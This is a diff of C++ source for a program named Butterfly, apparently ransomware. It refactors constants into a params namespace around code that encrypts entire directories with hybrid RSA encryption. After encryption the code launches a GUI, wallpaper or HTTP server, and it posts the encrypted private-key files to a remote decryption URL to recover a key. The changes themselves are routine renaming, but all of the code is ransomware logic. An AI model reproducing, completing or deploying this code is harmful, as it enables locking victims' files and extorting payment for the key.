@@ -45,13 +45,13 @@ void Butterfly::initLoggingFramework()
 
 void Butterfly::loadEncryptedFiles(std::string &cprivateRSAFileHex, std::string &rsaFileHex)
 {
-    if ( butterfly::existsFile(butterfly::ENC_CPRIVATERSA_FILENAME) )
+    if ( butterfly::existsFile(butterfly::params::ENC_CPRIVATERSA_FILENAME) )
     {
-        if ( butterfly::existsFile(butterfly::RSA_EKIV_FILENAME) )
+        if ( butterfly::existsFile(butterfly::params::RSA_EKIV_FILENAME) )
         {
             // Convert bin files to hex
-            std::string cprivatersa_bin = butterfly::readBinFile(butterfly::ENC_CPRIVATERSA_FILENAME);
-            std::string rsa_bin = butterfly::readBinFile(butterfly::RSA_EKIV_FILENAME);
+            std::string cprivatersa_bin = butterfly::readBinFile(butterfly::params::ENC_CPRIVATERSA_FILENAME);
+            std::string rsa_bin = butterfly::readBinFile(butterfly::params::RSA_EKIV_FILENAME);
 
             cprivateRSAFileHex = butterfly::string2Hex(cprivatersa_bin);
             rsaFileHex = butterfly::string2Hex(rsa_bin);
@@ -59,16 +59,16 @@ void Butterfly::loadEncryptedFiles(std::string &cprivateRSAFileHex, std::string 
         } else
         {
             #ifdef LOGGING
-            LOG_ERROR("File " << butterfly::RSA_EKIV_FILENAME << " not found");
+            LOG_ERROR("File " << butterfly::params::RSA_EKIV_FILENAME << " not found");
             #endif
-            throw FileNotFoundException("File " + butterfly::RSA_EKIV_FILENAME + " not found");
+            throw FileNotFoundException("File " + butterfly::params::RSA_EKIV_FILENAME + " not found");
         }
     } else
     {
         #ifdef LOGGING
-        LOG_ERROR("File " << butterfly::ENC_CPRIVATERSA_FILENAME << " not found")
+        LOG_ERROR("File " << butterfly::params::ENC_CPRIVATERSA_FILENAME << " not found")
         #endif
-        throw FileNotFoundException("File " + butterfly::ENC_CPRIVATERSA_FILENAME + " not found");
+        throw FileNotFoundException("File " + butterfly::params::ENC_CPRIVATERSA_FILENAME + " not found");
     }
 }
 
@@ -99,7 +99,7 @@ void Butterfly::run()
     {
         std::cout << "Start Encryption+Decryption from directory " << _args.dir << std::endl;
         // Start encryption
-        std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
+        std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(butterfly::params::RSA_KEYSIZE));
         encryptor->invokeDir(_args.dir, _args.protection);
 
         // After encryption start http server, gui or wallpaper
@@ -124,7 +124,7 @@ void Butterfly::run()
     {
         std::cout << "Start Encryption from directory " << _args.encrypt << std::endl;
 
-        std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
+        std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(butterfly::params::RSA_KEYSIZE));
         encryptor->invokeDir(_args.encrypt, _args.protection);
 
     }
@@ -140,10 +140,11 @@ void Butterfly::run()
         checkInternetConnection();
 
         // HTTPClient to send post request to decrypt the CPrivateRSA.bin file
-        std::unique_ptr<butterfly::HTTPClient> httpClient(new butterfly::HTTPClient(5000));
-        httpClient->setFormParam(butterfly::ENC_CPRIVATERSA_FILENAME, cprivateRSAFileHex);
-        httpClient->setFormParam(butterfly::RSA_EKIV_FILENAME, rsaFileHex);
-        std::string decryptedCPrivateRSAStr = httpClient->post(butterfly::REMOTE_DECRYPTION_URL);
+        std::unique_ptr<butterfly::HTTPClient> httpClient(new butterfly::HTTPClient(butterfly::params::REMOTE_DECRYPTION_URL_PORT));
+        httpClient->setFormParam(butterfly::params::ENC_CPRIVATERSA_FILENAME, cprivateRSAFileHex);
+        httpClient->setFormParam(butterfly::params::RSA_EKIV_FILENAME, rsaFileHex);
+        httpClient->setFormParam("RSAKeySize", std::to_string(butterfly::params::RSA_KEYSIZE));
+        std::string decryptedCPrivateRSAStr = httpClient->post(butterfly::params::REMOTE_DECRYPTION_URL);
 
         if ( httpClient->statusCode == 200 )
         {
@@ -168,7 +169,7 @@ void Butterfly::run()
         std::cout << "Start Decryption with provided key " << _args.serverpKey << " from directory " << _args.decrypt << std::endl;
 
         std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
-        decryptor->decryptCPrivateRSA(_args.serverpKey, butterfly::ENC_CPRIVATERSA_FILENAME);
+        decryptor->decryptCPrivateRSA(_args.serverpKey, butterfly::params::ENC_CPRIVATERSA_FILENAME);
         decryptor->invokeDir(_args.decrypt);
     }
     else
